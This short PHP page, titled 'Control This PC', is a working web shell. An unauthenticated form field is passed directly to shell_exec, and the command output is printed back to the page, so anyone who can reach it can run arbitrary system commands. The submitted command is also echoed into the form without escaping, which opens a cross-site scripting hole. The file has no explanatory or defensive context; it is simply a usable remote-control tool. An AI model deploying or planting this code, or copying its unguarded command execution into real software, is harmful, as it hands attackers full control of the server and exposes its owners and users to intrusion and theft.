<?php
$command = isset($_POST["command"])?$_POST["command"]:null;
$outputFromShell = (!is_null($command))?shell_exec($command):'';
?>
<html>

<head>
    <title>Control This PC</title>
</head>

<body>
    <form action="" method="post">
        <label>Command : </label>
        <input type="text" placeholder="Command : " name="command" value="<?php echo $command; ?>">
        <br>
        <button type="submit" name="submit">Submit</button>
        <hr>
    </form>
    <label>Output : </label>
    <?php  echo "<pre>$outputFromShell</pre>"; ?>
</body>

</html> 
